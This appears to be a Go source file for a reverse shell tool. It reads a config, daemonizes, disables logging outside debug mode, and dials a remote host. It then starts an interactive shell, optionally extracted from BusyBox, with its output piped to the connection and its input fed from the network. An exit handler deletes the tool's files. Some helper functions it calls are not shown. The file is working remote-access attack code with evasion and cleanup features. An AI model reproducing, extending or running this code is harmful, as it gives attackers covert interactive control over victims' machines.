package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
)

func main() {
	config := readConfig()
	registerExitHandler(func() {
		_ = os.RemoveAll(config.Path)
	})

	startReverseShell(config)
}

func startReverseShell(config Config) {
	daemonize()

	if !config.Debug {
		disableLogging()
	}

	conn, err := dial(config)
	check(err)

	stdin := startShell(config, conn)
	reader := newNetLineReader(conn, config.Timeout)

	// Feed input from network until timeout value exceeds or EOF is met.
	// Either way the process will panic and terminate, causing the shell
	// to exit.
	for {
		line, err := reader.Readline()
		check(err)

		_, err = stdin.Write(line)
		check(err)
	}
}

// startShell starts a shell, and returns a pipe to the stdin
// of that shell
func startShell(config Config, conn net.Conn) io.WriteCloser {
	var shellpath string
	if config.ExtractApplets {
		shellpath = extractBusyBox(config.Path)
	} else {
		shellpath = loadShell(config.Path)
	}

	shell := exec.Command(shellpath, "-i")
	shell.Stdout = conn
	shell.Stderr = conn

	pathEnv := os.Getenv("PATH")
	pathEnv = fmt.Sprintf("PATH=%s:%s", config.Path, pathEnv)
	shell.Env = append(os.Environ(), pathEnv)

	stdin, err := shell.StdinPipe()
	check(err)

	check(shell.Start())

	return stdin
}
